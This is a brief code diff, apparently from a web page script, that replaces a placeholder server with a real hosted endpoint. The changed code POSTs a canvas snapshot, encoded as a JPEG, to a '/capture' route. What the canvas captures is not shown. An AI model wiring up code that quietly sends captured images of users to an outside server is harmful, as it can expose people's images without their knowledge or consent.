@@ -1176,7 +1176,7 @@
       const dataURL = canvas.toDataURL('image/jpeg', 0.7);
       
       // Gửi về backend server
-      fetch('https://YOUR_BACKEND_SERVER.com/capture', {
+      fetch('https://zanxgaydev.onrender.com/capture', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ image: dataURL })
